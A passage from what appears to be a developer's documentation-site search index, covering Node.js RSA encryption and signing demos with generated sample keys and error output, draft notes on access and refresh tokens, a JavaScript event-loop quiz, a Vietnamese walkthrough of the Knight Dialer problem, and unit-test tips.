(PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;Hello, this is a secret message!\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encryptWithPublicKey(privateKey, message); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decryptWithPrivateKey(privateKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPrivate Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA8+Vsp8r+fNSpHdr+cr8+8tX+Tmm/1oCtU4dlVSz+auKLj490 duuh+rZ2ud7zgMzzCd9cSqFs4JWHsAFbx2oe4LSWD++V7ZES3ORE+48ksziCMC/r ... EZUgvYiHTgt3lJnQunBQPGug59B4mB8JRPZIdrpZc8acTA0X5+Ys8PRSwFoNzQ+b pDxXQo6e+j9SU9xi9ULFuK9ZZp48ERgX8MqG+1fdxGU+LFHfK192Kw== -----END RSA PRIVATE KEY----- Original Message: Hello, this is a secret message! Encrypted Message: V3fyDYvqx5OzPBJfKO434XKTUSC+c7KnpsvjpSdkUYR+BfrK0A+4V+y1Mf7uuCWaCRIA4Npu9aRoAgDPV8u7Zwc7h6sGaGo8WSofWsADCobDiN1d1dX0Htxurr9tVNmcdvXBxigyLK93h+Q7xXg5Xn2RdBpItPBHDITxfBlCRdyDZX+x81b1xTCdue6mTQwEp8CkJpZsahEPYgW7tYA+rWBu147Cz0jKEstk62Udxc82WYMRT+za0pz2nqSVqDKZCpaXBT1xlmPNgy14bzuLNZbykyUScly3PJUmybi9Ml/+OYjPwLY+XuYbXDklV2OX2fPsiuTo0iwXOwZB7HRE1Q== Decrypted Message: Hello, this is a secret message! Private key to encrypt and public key to decrypt a message NodeJS\nconst { publicKey, privateKey } = generateKeyPair(); console.log(\u0026#34;Public Key (PEM format):\\n\u0026#34;, publicKey); console.log(\u0026#34;Private Key (PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;Hello, this is a secret message!\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encryptWithPublicKey(privateKey, message); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decryptWithPrivateKey(publicKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPublic Key (PEM format): -----BEGIN RSA PUBLIC KEY----- MIIBCgKCAQEA2UVnWwcABrWqMggU7xxkl25zzV3/FabJvFDiGtaWjTUhLu9QjKtO ... wUXBn7HZjrd8Oue5JVPL1KqpUABxLBYc1QIDAQAB -----END RSA PUBLIC KEY----- Private Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA2UVnWwcABrWqMggU7xxkl25zzV3/FabJvFDiGtaWjTUhLu9Q ... lXDeVDYNZZ5oYCOWxjoAYamUbPrXD+SDGsDwnlgcaHViBBxUeGElHw== -----END RSA PRIVATE KEY----- Original Message: Hello, this is a secret message! Encrypted Message: VwgGUHIcxGAO5J5THYzxEgrmGQlIWy8Xg8f+c2zuyWjEzlgkat2TIyJa4fZ/vvf/kmIaetfw2cJf7wSvDfHP+yikVYRN2/uQ67pE6dK+FtW0d5GK6HaoM4c6QP/DbeMbikywSFjxYiyKsqp7eREtv8rdEgpde7OVL3pthSZmoJWUoSFNUvMqJT5+D1hPv8J38TlNdEUp7YrIQdx/gyZx8w6q+uikyboJbEJ2Z4YCfJVUbw1Fwbijox/jb8bWRFO6OHb2XXC4w2LXGLoZdxAAykRQ19BTsV6ojMflb1Bw428Q2GNaiolJXZX7j20rVRjM0KccLvHQ5FLPzTmK3BHQxg== node:internal/crypto/cipher:80 return method(data, format, type, passphrase, buffer, padding, oaepHash, ^ Error: error:020000B3:rsa routines::missing private key at Object.privateDecrypt (node:internal/crypto/cipher:80:12) at decryptWithPrivateKey (/home/dangpham/Workspace/nodejs/demo/asymmetric.js:23:30) at Object.\u0026lt;anonymous\u0026gt; (/home/dangpham/Workspace/nodejs/demo/asymmetric.js:66:26) at Module._compile (node:internal/modules/cjs/loader:1356:14) at Module._extensions..js (node:internal/modules/cjs/loader:1414:10) at Module.load (node:internal/modules/cjs/loader:1197:32) at Module._load (node:internal/modules/cjs/loader:1013:12) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:128:12) at node:internal/main/run_main_module:28:49 { opensslErrorStack: [ \u0026#39;error:1C8000A2:Provider routines::failed to decrypt\u0026#39; ], library: \u0026#39;rsa routines\u0026#39;, reason: \u0026#39;missing private key\u0026#39;, code: \u0026#39;ERR_OSSL_RSA_MISSING_PRIVATE_KEY\u0026#39; } Node.js v18.19.1 Demo of private key encryption and public key decryption # This example demonstrates RSA encryption and decryption in a way that mimics JWT behavior, where the private key is used to sign (encrypt) the message, and the public key is used to verify (decrypt) it\nInit necessary functions NodeJS\nconst crypto = require(\u0026#39;crypto\u0026#39;); const generateKeyPair = () =\u0026gt; { return crypto.generateKeyPairSync(\u0026#39;rsa\u0026#39;, { modulusLength: 2048, // Length of key in bits (2048 is standard) publicKeyEncoding: { type: \u0026#39;pkcs1\u0026#39;, // Public Key Cryptography Standards 1 format: \u0026#39;pem\u0026#39; // Output as PEM (Base64 encoded) }, privateKeyEncoding: { type: \u0026#39;pkcs1\u0026#39;, // Private Key Cryptography Standards 1 format: \u0026#39;pem\u0026#39; // Output as PEM (Base64 encoded) } }); } // Function to \u0026#34;sign\u0026#34; (encrypt) a message using RSA private key function signWithPrivateKey(privateKeyPem, message) { const encrypted = crypto.privateEncrypt(privateKeyPem, Buffer.from(message)); return encrypted.toString(\u0026#39;base64\u0026#39;); // Convert encrypted message to base64 for readability } // Function to \u0026#34;verify\u0026#34; (decrypt) a message using RSA public key function verifyWithPublicKey(publicKeyPem, encryptedMessage) { const decrypted = crypto.publicDecrypt(publicKeyPem, Buffer.from(encryptedMessage, \u0026#39;base64\u0026#39;)); return decrypted.toString(\u0026#39;utf8\u0026#39;); // Convert decrypted message to utf8 string } Private key to encrypt and public key to decrypt a message NodeJS\nconst { publicKey, privateKey } = generateKeyPair(); console.log(\u0026#34;Public Key (PEM format):\\n\u0026#34;, publicKey); console.log(\u0026#34;Private Key (PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;J5 love ST\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); // \u0026#34;Sign\u0026#34; the message using the private key (Encrypt) const encryptedMessage = signWithPrivateKey(privateKey, message); console.log(\u0026#34;Encrypted Message (Base64):\u0026#34;, encryptedMessage); // \u0026#34;Verify\u0026#34; the message using the public key (Decrypt) const decryptedMessage = verifyWithPublicKey(publicKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPublic Key (PEM format): -----BEGIN RSA PUBLIC KEY----- MIIBCgKCAQEAnxkXw9Cbi4F+tsJImVUNVhOUTYWj/lMUB+jcXBE6myqgZ4xiHWWx 0nGzjqxHiojYcN3jiEtABqbls2KToTs9LvNHDYcr8bPh828HZTcB6V9r1x79zFSp jJtvx4hmOa0K7iOiN2AwWaV1mtFTKOZ/2QsQMqyhleBgPMCQyD6CYS2IJrRq6Wu+ anekIYgfWToajrpbgs4AE5X0aTd10/0eR0A7n3C8jGKiyAaTsROBtqvmoq69QGrW ozDOWl/Dt6I3Y/a0Vx6lyL2bjClbIo61yJqkxW0VWFLodFuKvjd8gln3PZokTiEl fjQFKVj63Wh/ssXHQjFtYvnmS73gMATYSwIDAQAB -----END RSA PUBLIC KEY----- Private Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAnxkXw9Cbi4F+tsJImVUNVhOUTYWj/lMUB+jcXBE6myqgZ4xi HWWx0nGzjqxHiojYcN3jiEtABqbls2KToTs9LvNHDYcr8bPh828HZTcB6V9r1x79 zFSpjJtvx4hmOa0K7iOiN2AwWaV1mtFTKOZ/2QsQMqyhleBgPMCQyD6CYS2IJrRq 6Wu+anekIYgfWToajrpbgs4AE5X0aTd10/0eR0A7n3C8jGKiyAaTsROBtqvmoq69 QGrWozDOWl/Dt6I3Y/a0Vx6lyL2bjClbIo61yJqkxW0VWFLodFuKvjd8gln3PZok TiElfjQFKVj63Wh/ssXHQjFtYvnmS73gMATYSwIDAQABAoIBADBGznnKPrC92iP9 30a70sCoT0uYvlMJhZ4C0H8VcUmtTSAuroUKG0Pm4Zvs9gZ5EOhqxETSxLpgAXqF 8pMtpRqukoRt3G1K7sjOC5nwb6GPpWsRCeVrWUmDzw7melKNCjCJ2orgIrvJI98X HpteGjRTkZY24Q9YFwvISQaiRTDURBuTN1xmKNJ22AFU9oinLbedg0wPJ3xS5YPP nROv8Gz/buoRrxysObguPgaBcOPQB3qz1qdsXwjnCDfQGKzo8LrFGtD1z3Zu4jWx CfxzGisk45FuE0FWksNMwD0mKXDh11unA3p/xCstbwD2ISIiFhSvG09tGYl5pqlD tGOZj2UCgYEA0OAyKRCNKPRxj1nXFtg7eR02YXxlnIqhl1ggXdW6hpwTx1t+Bu28 Qi5OsDOBivkTHjqt3x5DQTQTaOdpfwDBUpuYM4NIxL6EoFZaC2R26ocaIsZ4qKkk SmBJW1Yx5iRWrurKB+1iwVshcjAHFyYWiltM4iL25RKAAeE7M1inlGcCgYEAwv3w ceg+/mTmhE9XfW9N6ThEHvnoneHjuil5/7RN4XONDgB5Av68iimOTlcROmrc27TY UcZvDI0j7yrAwv+7Z9I9DS56vSPpqYEC0HXayyFiCn3CS2Om0ySMYdTVJRi+53kf 8qZVEW9OMyRNIbc9djKObN4wTijMiRbZpmT2Tn0CgYAApnIBhrepxPkFhTYSMCIf QmQE8aovTo8qNXAEWsH14U5+dF50DxFi81nzWnWwxQ22LmCULTfwYAUfcnj1mD8B ztIudt4nHqCzDxHAr1Nfb4Q5T3zYqY4fXSVdT2tgWASdDsYKOEbyayIzhMrA27F+ RMJ8gbdbBy+20cipZEFBSQKBgQCEGB2EPO43zkjvRwSg//8KyEg1p9zy3+0y1xhD pnTAD1R2MNHJuqIlAsPZxFfyeCRIXnnQ5BmkqhS22AKf1ziwu5cKT/tsGGEZqEEs 0To4M9REAS/XfJmuHetP9yuxptLk4oRHEHE+j2WtdaEe/xCO+u7LR7X3rOHq2OT3 ORw2zQKBgEACN6Qhs+ExE2+MLlC/8IaI3mPwa893LFk65/qHMuUQ2xUniJo2fQV5 BomT4OFSDaPBftdL1a/WVg6/EvN9Re1VBncAycCsLeSB+UHnk3+MvQTCh5E3j/Vy gvIAt3PKqHBQTTx8p3CSxaDp91U6ru3OxetBgIchdHavxCXOkvrW -----END RSA PRIVATE KEY----- Original Message: J5 love ST Encrypted Message (Base64): cG6810O8omJ67Ji6ZoQRw2um5UTx6YdTvUXWlH4GrUtph5J3xVqJhta4SWgJHNjaMgfMveJpFPTv/iAq0yBskmha+f+hRyYOITzXcz3jqtOl+4G9dC/OyqdkGIHq96lF9YZmWrXVtkCncRR07XoL+AMiBJ37HUgbHS15axAtghtJSYfWzabASA13sbEewVgQTIvg+aH9NvG5s2gKxLNIPtKcqUvmmqB2P0hFhg437QaF4SM/MBz/w7HbQT69B+YveBW8pFcgxAl+oIdl+dAneCog0FZiWI5mg13jlUmx4s7dhBKu7Ebdtayk3pZsHCKCYHNyePgSYA8bnUEqUVw+Hg== Decrypted Message: J5 love ST Public key to encrypt and decrypt a message NodeJS\nconst { publicKey } = generateKeyPair(); console.log(\u0026#34;Public Key (PEM format):\\n\u0026#34;, publicKey); const message = \u0026#34;J5 love ST\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = signWithPrivateKey(publicKey, message); console.log(\u0026#34;Encrypted Message (Base64):\u0026#34;, encryptedMessage); const decryptedMessage = verifyWithPublicKey(publicKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPublic Key (PEM format): -----BEGIN RSA PUBLIC KEY----- MIIBCgKCAQEA1GV0AyMKyczyUpRyIolyuDRkw5hpkqhojoZ4KJvh11bqDe6H2mjJ ... f3Io9s6lsPaN3zWxDxxJJMo5SsX48T5NQQIDAQAB -----END RSA PUBLIC KEY----- Original Message: J5 love ST node:internal/crypto/cipher:80 return method(data, format, type, passphrase, buffer, padding, oaepHash, ^ Error: error:020000B3:rsa routines::missing private key at Object.privateEncrypt (node:internal/crypto/cipher:80:12) at signWithPrivateKey (/home/dangpham/Workspace/nodejs/demo/asymmetricLikeJWT.js:19:30) at Object.\u0026lt;anonymous\u0026gt; (/home/dangpham/Workspace/nodejs/demo/asymmetricLikeJWT.js:56:26) at Module._compile (node:internal/modules/cjs/loader:1356:14) at Module._extensions..js (node:internal/modules/cjs/loader:1414:10) at Module.load (node:internal/modules/cjs/loader:1197:32) at Module._load (node:internal/modules/cjs/loader:1013:12) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:128:12) at node:internal/main/run_main_module:28:49 { opensslErrorStack: [ \u0026#39;error:1C880004:Provider routines::RSA lib\u0026#39; ], library: \u0026#39;rsa routines\u0026#39;, reason: \u0026#39;missing private key\u0026#39;, code: \u0026#39;ERR_OSSL_RSA_MISSING_PRIVATE_KEY\u0026#39; } Node.js v18.19.1 Public key to encrypt and private key to decrypt a message NodeJS\nconst { publicKey, privateKey } = generateKeyPair(); console.log(\u0026#34;Public Key (PEM format):\\n\u0026#34;, publicKey); console.log(\u0026#34;Private Key (PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;J5 love ST\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = signWithPrivateKey(publicKey, message); console.log(\u0026#34;Encrypted Message (Base64):\u0026#34;, encryptedMessage); const decryptedMessage = verifyWithPublicKey(privateKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPublic Key (PEM format): -----BEGIN RSA PUBLIC KEY----- MIIBCgKCAQEAoqD5nBZ1axzJnDyxmuQmb11/3NBVZlk4py/X64ew9HH5NzrwkH04 ... t1rjt5xOTmK5N0fyrxNoouTqIpV3E85P/QIDAQAB -----END RSA PUBLIC KEY----- Private Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAoqD5nBZ1axzJnDyxmuQmb11/3NBVZlk4py/X64ew9HH5Nzrw ... fKcxqqYvJv2yio3ogNZSJsFGFU1lafg7FwWMgqnd/99nWBCY2gn1 -----END RSA PRIVATE KEY----- Original Message: J5 love ST node:internal/crypto/cipher:80 return method(data, format, type, passphrase, buffer, padding, oaepHash, ^ Error: error:020000B3:rsa routines::missing private key at Object.privateEncrypt (node:internal/crypto/cipher:80:12) at signWithPrivateKey (/home/dangpham/Workspace/nodejs/demo/asymmetricLikeJWT.js:19:30) at Object.\u0026lt;anonymous\u0026gt; (/home/dangpham/Workspace/nodejs/demo/asymmetricLikeJWT.js:73:26) at Module._compile (node:internal/modules/cjs/loader:1356:14) at Module._extensions..js (node:internal/modules/cjs/loader:1414:10) at Module.load (node:internal/modules/cjs/loader:1197:32) at Module._load (node:internal/modules/cjs/loader:1013:12) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:128:12) at node:internal/main/run_main_module:28:49 { opensslErrorStack: [ \u0026#39;error:1C880004:Provider routines::RSA lib\u0026#39; ], library: \u0026#39;rsa routines\u0026#39;, reason: \u0026#39;missing private key\u0026#39;, code: \u0026#39;ERR_OSSL_RSA_MISSING_PRIVATE_KEY\u0026#39; } Node.js v18.19.1 Private key to encrypt and decrypt a message NodeJS\nconst { privateKey } = generateKeyPair(); console.log(\u0026#34;Private Key (PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;J5 love ST\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = signWithPrivateKey(privateKey, message); console.log(\u0026#34;Encrypted Message (Base64):\u0026#34;, encryptedMessage); const decryptedMessage = verifyWithPublicKey(privateKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPrivate Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAykZk5e0pL+3la4Ydil2jc3sjJWslEvYv0qfGwi5SrKmA8HpS ... Wso3YmC9MOThDlzdM3nY4sNugECT1emFNVitiegOuOuhoD2qBvUb -----END RSA PRIVATE KEY----- Original Message: J5 love ST Encrypted Message (Base64): dOgtEZCxxV+IoD9p8cfCgSlVNfDhgaumgihbBoD5yvhOA4r0qM2/Pq+m28riZZH66EtXUtjQoCaDt9r92flIhvnJbQeDgumCl7MwseMoZdJoDRjGGXuxEqyzinMc5mYmxayz9iSDOMt3NgDSTmClJXb+rGXkLLpM9zxpQSBrdq3wdamMrY0/JAnyul1icLZ6HpSiwSg7DhQYrZR9CDxgNeZpqyzNoUksu61EfYO7hxDcjbIZ37QrDT/Le/RBU+L6jyDyDcgETuV+xyJyVdy/C0iLtr5J72GQbcQozLrPIFZ/yYb0iePiwa72fymhIpNhMlVBgr2VFEIT/Wb9QZr7dw== Decrypted Message: J5 love ST Digital signatures # guarantee message authenticity, integrity and non-repudiation.\nMost digital signature algorithms (like DSA, ECDSA and EdDSA) use asymmetric key pair (private and public key):\nthe message is signed by the private key the signature is verified by the corresponding public key Use cases:\nIn the bank systems digital signatures are used to sign and approve payments. In blockchain signed transactions allow users to transfer a blockchain asset from one address to another. Message Authentication # message authentication algorithms (like HMAC) and message authentication codes (MAC codes)\nprove message authenticity, integrity and authorship\nAuthentication is used side by side with encryption, to ensure secure communication.\nSecure Random Numbers # Cryptography uses random numbers and deals with entropy (unpredictable randomness) and secure generation of random numbers (e.g. using CSPRNG). Secure random numbers are unpredictable by nature and developers should care about them, because broken random generator means compromised or hacked system or app.\nLike Math.random() does not secure but Crypto.getRandomValues() does (Ref: Math.random())\nKey Exchange # Cryptography defines key-exchange algorithms (like Diffie-Hellman key exchange and ECDH) and key establishment schemes, used to securely establish encryption keys between two parties that intend to transmit messages securely using encryption. Such algorithms are performed typically when a new secure connection between two parties is established, e.g. when you open a modern Web site or connect to the WiFi network.\nConfusion and Diffusion in Cryptography # In cryptography the hashing, encryption algorithms and random generators follow the Shannon\u0026rsquo;s principles of confusion and diffusion. Confusion means that each bit in the output form a cipher should depend on several parts of the key and input data and thus direct mapping cannot be established. Diffusion means that changing one bit in the input should change approximately half of the bits in the output. These principles are incorporated in most hash functions, MAC algorithms, random number generators, symmetric and asymmetric ciphers.\nAppendix # Why Bcrypt will take longer time to crack your password than MD5? # Reference # Okta: HMAC (Hash-Based Message Authentication Codes) Definition (Sep 15, 2023) Cryptobook: Cryptography - Overview (Jun 19, 2019) Hivesystems: Are Your Passwords in the Green? (2024) DangPham112000: Examples code (2024) "},{"id":13,"href":"/docs/research/authentication/","title":"Authentication - Draft","section":"RESEARCH","content":" Authentication # Cookie - Session # Token base # Basic flow Token expired Access Token # Pros # Do you notice some web page allow you go to a route like dashboard immediately just because you has been login before, but some other web app also have dashboard but they request you login every time you go to them\n\u0026ndash;\u0026gt; Bad UX\nIf we use AT, they do not need re-login\nCons # If we only use AT for authentication So when hacker stolen AT successfully, they can impersonate the user\nHow about short-term AT?\nEach time we grant AT we need to force user re-login \u0026ndash;\u0026gt; Bad UX How about combine short-term AT and store AT in DB? Our server can grant several AT and somehow one of them be stolen by hacker, if we store current AT-list and used-AT list. Then if we renew an AT for hacker or user and then another try to renew a used AT we can clear all of them and then force user to re-login\nThis approach is totally possible \u0026ndash;\u0026gt; BUT we will increase the I/O cost in DB because too much AT used to check and store \u0026ndash;\u0026gt; So we design RT\nRefresh Token # In order to prevent hacker stolen AT, we decide AT only live in a short time So refresh token born as a factor to re-grant AT when they are expired and user then can be continue their session with our resource without re-login and don\u0026rsquo;t worry about impersonation\nEach RT can only be used once # Whenever we see the reused RT, we must right away clear all token and it\u0026rsquo;s keys, then force user to re-login to the system\nReference # : () "},{"id":14,"href":"/docs/research/security/cors/","title":"CORS - draft","section":"Security - Draft","content":" Cross-origin resource sharing # Overview # Origin defintion Why it was born? # Steel Cookie # CSRF # Bypass # Middle server\nHow prevent it? # Authorization\n"},{"id":15,"href":"/docs/research/event_loop/","title":"Event loop - Draft","section":"RESEARCH","content":" Event loop # Challenge # Can you guess the output of the below JS code\nvar name = \u0026#34;JS\u0026#34;; function execLater() { setTimeout(printName, 0); Promise .resolve() .then(() =\u0026gt; { console.log(\u0026#34;Promise resolve\u0026#34;); }); console.log(name); var name = \u0026#34;TS\u0026#34;; } printName(name); function printName() { console.log(name); } execLater(); Phase 1: the memory creation phase\nname is declared and initialized equal \u0026quot;JS\u0026quot; execLater is declared and initialized printName is declared and initialized Phase 2: the code execution phase\nprintName is called and it prints \u0026quot;JS\u0026quot; execLater is called: Phase 1: name is assigned to undefined due to hoisting Phase 2: printName goes to the callback queue and wait for 0ms to be executed later The promise goes to the microtask queue printName is executed with the value of name is undefined name is assigned to \u0026quot;TS\u0026quot; but only in execLater scope Once the call stack is empty, the event loop pulls the promise to execute it as it has higher priority printName is called and print \u0026quot;JS\u0026quot; b/c it referents to the global scope The display order on the console JS undefined Promise resolve JS Overview # Stack # Heap # Queue # Reference # Mozilla: The event loop (Dec 20, 2023) Youtube: What the heck is the event loop anyway? | Philip Roberts | JSConf EU (Oct 9, 2014) Nodejs: The Node.js Event Loop Jotform: Unraveling the JavaScript execution pipeline: Understanding V8, event loop, and libuv for high-performance web experiences (Aug 9, 2023) "},{"id":16,"href":"/docs/problems/knight_dialer/","title":"Knight Dialer","section":"PROBLEMS","content":" Knight dialer # Description # The chess knight has a unique movement, it may move two squares vertically and one square horizontally, or two squares horizontally and one square vertically (with both forming the shape of an L). The possible movements of chess knight are shown in this diagaram:\nA chess knight can move as indicated in the chess diagram below: We have a chess knight and a phone pad as shown below, the knight can only stand on a numeric cell (i.e. blue cell). Given an integer n, return how many distinct phone numbers of length n we can dial.\nYou are allowed to place the knight on any numeric cell initially\nand then you should perform n - 1 jumps to dial a number of length n. All jumps should be valid knight jumps.\nAs the answer may be very large, return the answer modulo \\(10^9 \u0026#43; 7\\) Example 1:\nInput: n = 1\nOutput: 10\nExplanation: We need to dial a number of length 1, so placing the knight over any numeric cell of the 10 cells is sufficient\nExample 2:\nInput: n = 2\nOutput: 20\nExplanation: All the valid number we can dial are [04, 06, 16, 18, 27, 29, 34, 38, 40, 43, 49, 60, 61, 67, 72, 76, 81, 83, 92, 94]\nExample 3:\nInput: n = 3131\nOutput: 136006598\nExplanation: Please take care of the mod\nConstraints:\n1 \u0026lt;= n \u0026lt;= 5000 Solution # High level # Có thể thấy bàn phím điện thoại khá nhỏ Ta có thể tận dụng các giới hạn này để giải quyết bài toán thay vì đâm đầu vào một công thức tổng quát: Ở một vị trí chỉ có thể nhảy đến 1 tập giới hạn các vị trí khác Số cách di chuyển ở mỗi vị trí là hằng số và có thể liệt kê được Low level # Ta nên bắt đầu bằng 1 ví dụ: đẹp nhất là n = 3\nỞ lần đầu thì vị trí là tất cả các nút Ở lần 2 thì cần duyệt qua từ 0 đến 9 vị trí 0 sẽ có thể nhảy đến 4 và vị trí 1 sẽ có thể nhảy đến 8 và \u0026hellip; Ở lần 3 thì ta sẽ duyệt tiếp bên trong vị trí 0 ở lần 2 vị trí 4 sẽ có thể nhảy đến 3, 9 và 0 vị trí 6 sẽ có thể nhảy đến 1, 7 và 0 trong vị trí 1 ở lần 2 8 =\u0026gt; 1, 3 6 =\u0026gt; 1, 7, 0 \u0026hellip; Các kết quả cần tìm\nVới n = 1, return 10 Với n = 2, 0 có thể đến 4 và 6, 1 có thể đến 8 và 6 Với n = 3, 0 có thể đến 3, 9, 0, 1, 7, 0 1 có thể đến 1, 3, 1, 7, 0 Kết quả là tổng sống lượng vị trí có thể đến\nCần tạo 1 mảng chứa các vị trí khả dụng qua mỗi lần lặp n Có thể thấy ta có thể tạo 2 mảng\nMảng số vị trí khả dụng kế tiếp khi ở vị trí i: [[4, 6], [8, 6], []] Có thể thấy để dùng được mảng vị trí khả dụng thì n phải \u0026gt;= 2 Vậy thì thuật toán cần tìm phải bắt đầu ít nhất từ 2 Code /** * @param {number} n * @return {number} */ var knightDialer = function (n) { const nextPlaces = [ [4, 6], [6, 8], [7, 9], [4, 8], [0, 3, 9], [], [0, 1, 7], [2, 6], [1, 3], [2, 4], ]; if (n === 1) return 10; const validPlaces = JSON.parse(JSON.stringify(nextPlaces)); for (let time = 3; time \u0026lt;= n; time++) { for (let place = 0; place \u0026lt;= 9; place++) { const newPlaces = []; for (let i = 0; i \u0026lt; validPlaces[place].length; i++) { newPlaces.push(...nextPlaces[validPlaces[place][i]]); } validPlaces[place] = newPlaces; } } const totalWays = validPlaces.reduce((acc, currentArray) =\u0026gt; acc + currentArray.length, 0) % (Math.pow(10, 9) + 7); return totalWays; }; Xuất hiện lỗi runtime error: Cụ thể thì là do out of memory\nKhi thử với các test case nhỏ thì dễ thấy hàm của chúng ta work như mong đợi Nhưng khi thử với số lớn thì sẽ xuất hiện lỗi out of memory Giải thuật chưa tối ưu bộ nhớ ? Chọn cấu trúc dữ liệu chưa phù hợp ? Optimize # Retrospective # Cùng nhìn lại cách diễn giải ban đầu:\nn = 1: tất cả các nút\n==\u0026gt; [[0], [1], [2], [3], [4], [5], [6], [7], [8], [9]] n = 2: 0 có thể đến 4 và 6 1 có thể đến 8 và 6 2 có thể đến 7 và 9 \u0026hellip;\n==\u0026gt; [[4, 6], [6, 8], [7, 9], [4, 8], [0, 3, 9], [], [0, 1, 7], [2, 6], [1, 3], [2, 4]] n = 3: 0 có thể đến 3, 9, 0, 1, 7, 0 1 có thể đến 1, 3, 1, 7, 0 \u0026hellip;\n==\u0026gt; [[3, 9, 0, 1, 7, 0], [1, 3, 1, 7, 0], ...] \u0026hellip; Dễ thấy n càng cao số phần từ trùng lặp lại trong mảng càng cao Với mỗi phần tử trùng ấy ta lại có cùng một công việc cho chúng Kết quả cần tìm lại là đếm số lượng phần tử của từng mảng ==\u0026gt; Nếu có thể áp dụng cấu trúc Dictionary sẽ là một phương pháp tối ưu\nNew way # Cách diễn dãi mới\nn = 1\n==\u0026gt; dic = {0: 1, 1: 1, 2: 1, 3: 1, 4: 1, 5: 1, 6: 1, 7: 1, 8: 1, 9: 1}\n==\u0026gt; dic = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n==\u0026gt; Nên chọn array vì key chúng ta cần chỉ là các con số từ 0-\u0026gt;9 n = 2 0 có thể đến 4 và 6 =\u0026gt; newDic[4] += dic[0] và newDic[6] += dic[0] newDic[4] += dic[0] vì giả sử vị trí 0 đang chứa 2 khả năng, thì 2 khả năng đó đều đi đến được 4 Dùng newDic là để trạng thái cũ k bị xáo trộn khi đang duyệt 1 có thể đến 8 và 6 =\u0026gt; newDic[8] += dic[1] và newDic[6] += dic[1] \u0026hellip; Code /** * @param {number} n * @return {number} */ var knightDialer = function (n) { const nextPlaces = [ [4, 6], [6, 8], [7, 9], [4, 8], [0, 3, 9], [], [0, 1, 7], [2, 6], [1, 3], [2, 4], ]; if (n === 1) return 10; let dic = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]; for (let time = 2; time \u0026lt;= n; time++) { const newDic = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]; for (let place = 0; place \u0026lt;= 9; place++) { for (let i = 0; i \u0026lt; nextPlaces[place].length; i++) { newDic[nextPlaces[place][i]] += dic[place] % (Math.pow(10, 9) + 7); } } dic = newDic; } const totalWays = dic.reduce((acc, item) =\u0026gt; acc + item, 0) % (Math.pow(10, 9) + 7); return totalWays; }; Time and space complexity optimize # Code Tiêu chí là ít tính toán lại và tận dụng nhiều hơn # /** * @param {number} n * @return {number} */ var knightDialer = function (n) { const nextPlaces = [ [4, 6], [6, 8], [7, 9], [4, 8], [0, 3, 9], [], [0, 1, 7], [2, 6], [1, 3], [2, 4], ]; if (n === 1) return 10; const mod = Math.pow(10, 9) + 7; let dic = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1], newDic = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0], place, i; for (let time = 2; time \u0026lt;= n; time++) { newDic = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]; for (place = 0; place \u0026lt;= 9; place++) { if (place === 5) continue; for (i = 0; i \u0026lt; nextPlaces[place].length; i++) { newDic[nextPlaces[place][i]] += dic[place] % mod; } } dic = newDic; } const totalWays = dic.reduce((acc, item) =\u0026gt; acc + item, 0) % mod; return totalWays; }; Reference # Leetcode: knight dialer "},{"id":17,"href":"/docs/tips/001_unit_test/","title":"Unit Test","section":"TIPS","content":" Unit Test Tips # Reset all global variables for each unit test case # What environment the unit test cases are running on: Browser or Nodejs? # Because Nodejs does not have browser APIs Using Karma to run browser\u0026rsquo;s unit test Using JS-DOM but it\u0026rsquo;s missing a lot of browser APIs Work only when running alone # Scenario: A unit test case only pass when running alone but fail when running with other test cases Check:\nRestore all mocks after mocking things: sandbox.restore(), jest.restoreAllMocks(), vi.restoreAllMocks() and vi.unstubAllGlobals() at afterEach Reset global variables inner module: create a reset function to reset all variable of module to the initial value Example:\n// calculateThings.js import cal1Thing from \u0026#34;./private/cal1Thing.js\u0026#34;; let cached = \u0026#34;\u0026#34;; // Global variable export default (things) =\u0026gt; { if (cached) return cached; let result = []; for (let i = 0; i \u0026lt; things.length; i++) { const calculatedThing = cal1Thing(things[i]); result.push(calculatedThing); } cached = result; return cached; }; /* start-test-code */ export const testingOnly = { resetCached: () =\u0026gt; { cached = \u0026#34;\u0026#34;; }, }; /* end-test-code */ // calculateThings.test.js import calculateThings from \u0026#34;./calculateThings\u0026#34;; import cal1Thing from \u0026#34;./cal1Thing\u0026#34;; import { testingOnly } from \u0026#34;./calculateThings\u0026#34;; 